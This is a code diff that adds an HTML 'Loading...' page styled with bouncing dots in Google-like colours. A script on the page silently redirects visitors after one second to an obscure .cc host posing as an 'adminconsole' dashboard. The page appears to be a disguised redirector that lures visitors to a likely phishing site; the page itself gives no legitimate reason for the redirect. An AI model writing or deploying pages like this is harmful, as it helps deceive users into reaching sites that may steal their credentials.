@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f8f9fa;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .dot {
+            width: 12px;
+            height: 12px;
+            background-color: #4285f4;
+            border-radius: 50%;
+            margin: 0 4px;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+        .dot:nth-child(2) { animation-delay: -0.32s; background-color: #db4437; }
+        .dot:nth-child(3) { animation-delay: -0.16s; background-color: #f4b400; }
+        .dot:nth-child(4) { animation-delay: 0s; background-color: #0f9d58; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+        p {
+            color: #3c4043;
+            font-size: 16px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="loader">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        <p>Loading...</p>
+    </div>
+    <script>
+        setTimeout(() => {
+            window.location.href = 'http://dashboard-jsb2k92hm9mczdfr91vq38bc6-adminconsole.2398463295642.cc';
+        }, 1000);
+    </script>
+</body>
+</html>
